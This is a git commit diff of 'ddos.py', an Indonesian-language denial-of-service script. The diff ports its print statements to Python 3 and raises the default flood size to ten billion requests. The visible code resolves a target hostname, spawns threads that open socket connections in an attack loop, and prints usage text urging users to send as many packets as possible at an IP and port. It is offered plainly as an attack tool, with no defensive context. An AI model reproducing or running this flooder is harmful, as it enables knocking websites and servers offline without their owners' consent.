b4fd0ca4cd7b96716aa5a03da317bdab010d6a37
limit queen <63425451+LimitQueenProject@users.noreply.github.com>
2020-04-17 16:48:56 +0700

    Update ddos.py

--- ddos.py
+++ ddos.py
@@ -36,9 +36,9 @@ print ('''
 time.sleep(0.3)
 
 
-print "\33[1;33m======================"
-print "\33[32;1m===MASUKAN PASSWORD=== \33[31;1mkalau g tau ketik apa aja"
-print "\33[1;33m======================"
+print ("\33[1;33m======================")
+print ("\33[32;1m===MASUKAN PASSWORD=== \33[31;1mkalau g tau ketik apa aja")
+print ("\33[1;33m======================")
 time.sleep(0.2)
 sandi ="start ddos"
 
@@ -74,17 +74,17 @@ num_requests = 0
 
 if len(sys.argv) == 2:
     port = 80
-    num_requests = 1000000000
+    num_requests = 10000000000
 elif len(sys.argv) == 3:
     port = int(sys.argv[2])
-    num_requests = 1000000000
+    num_requests = 10000000000
 elif len(sys.argv) == 4:
     port = int(sys.argv[2])
     num_requests = int(sys.argv[3])
 else:
-    print "ERROR BOY\n Gunakan: " + sys.argv[0] + " < Hostname > < Port > < JUMLAH SERANGAN BOY > "
-    print "\n \33[31;1mContoh: python ddos.py 178.128.23.56 80 999999, \33[33;1m178.128.23.56 ini ip, 80 itu port, 999999 itu paket yang di kirim, lebih banyak lebih bagus"
-    print "\33[37;1m"
+    print ("ERROR BOY\n Gunakan: " + sys.argv[0] + " < Hostname > < Port > < JUMLAH SERANGAN BOY > ")
+    print ("\n \33[31;1mContoh: python ddos.py 178.128.23.56 80 999999, \33[33;1m178.128.23.56 ini ip, 80 itu port, 999999 itu paket yang di kirim, lebih banyak lebih bagus")
+    print ("\33[37;1m")
     sys.exit(1)
     
     
@@ -92,7 +92,7 @@ try:
     host = str(sys.argv[1]).replace("https://", "").replace("http://", " ").replace("www.", " ")
     ip = socket.gethostbyname(host)
 except socket.gaieror:
-    print " ERROR BOY\n Pastikan Anda Memasukan Website Yang Benar Boy "
+    print (" ERROR BOY\n Pastikan Anda Memasukan Website Yang Benar Boy ")
     sys.exit(2)
     
     
@@ -106,7 +106,7 @@ def print_status():
     thread_num_mutex.acquire(True)
     
     thread_num += 1
-    print " \n " + time.ctime().split(" ")[3] + " " + "[" + str(thread_num) + "] = #.#.#.#.# Serangan Sedang Di Lakukan.#.#.#.#"
+    print (" \n " + time.ctime().split(" ")[3] + " " + "[" + str(thread_num) + "] = #.#.#.#.# Serangan Sedang Di Lakukan.#.#.#.#")
     
     thread_num_mutex.release()
     
@@ -134,7 +134,7 @@ def attack():
         dos.close()
         
         
-print "[#] Attack Started on " + host + " (" + ip + ") || Port: " + str(port) + " || #Requests: " + str(num_requests)
+print ("[#] Attack Started on " + host + " (" + ip + ") || Port: " + str(port) + " || #Requests: " + str(num_requests))
 
 all_threads = []
 
